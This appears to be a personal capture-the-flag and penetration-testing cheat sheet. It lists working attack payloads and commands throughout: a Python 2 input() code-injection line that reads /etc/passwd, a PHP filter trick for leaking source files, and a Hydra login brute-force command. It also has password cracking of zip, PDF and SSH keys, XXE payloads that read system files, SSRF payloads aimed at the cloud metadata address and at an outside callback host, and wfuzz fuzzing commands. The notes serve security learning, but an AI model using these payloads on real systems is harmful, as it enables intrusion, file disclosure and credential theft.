## Learnings:
input() in python2 is not safe, equivalent to eval() 

exploiting input() command: 

```__import__("os").system('cat /etc/passwd')```


##  PHP:
fetching source files : 

index.php?file=php://filter/convert.base64-encode/resource=config 

## Hydra:
hydra -s 45885 -l admin www.bruteforce.me -P rockyou.txt http-form-post "/:password=^PASS^:F=Invalid"

"/login.php:user=^USER^&pass=^PASS^:S=successful"  from docs.

follow the format ' path : inputs : F=failure condition'   , -s specifies port , even if u send pass only, specify user for it to run smoothly

## ssh2john

crack hashes from rsa private key certificates ( passphrase locked)

## Zip2John
zip2john zipfile.zip > passwordhash

john --format=pkzip passwordhash  ( depends on the format of archive/hash, look at previous output )

## PDFCrack
pdfcrack -f locked.pdf -w rockyou.txt

## Cyberchef is really good on the fly

## XXE:
### Normal request:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

### Crafted request:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck> 
```
### SSRF 
`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> `
### blind SSRF test with your own server
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://toto.afri.ca"> ]> `
##### inline SSRF 
```<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://toto.afri.ca"> %xxe; ]>```

### xxe in svg
```<?xml version="1.0" standalone="yes"?><!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> ```

## Bruteforce/fuzzing

### wfuzz

#### hide 404
`./wfuzz -w wordlist/general/big.txt --hc 404 http://xxxxxxxxzxzx.zxz/FUZZ`
#### parameters
`./wfuzz -w wordlist/general/megabeast.txt --hh 24 http://xxxxx.zxv/api/action.php?FUZZ=1`
#### numericals
`./wfuzz -z range,0-10000 --hh 27 http://xxxxxx.xxx/api/action.php?reset=FUZZ`
### data
`./wfuzz -w wordlist/general/big.txt -d "FUZZ=1" http://xxxxx.xxx/api/action.php`


## Reversing

Dealing with stripped binaries https://reverseengineering.stackexchange.com/questions/1935/how-to-handle-stripped-binaries-with-gdb-no-source-no-symbols-and-gdb-only-sho

## sudo
if you got something juicy in sudo -l , but still cant read get the command to work, try impersonating another user with -u
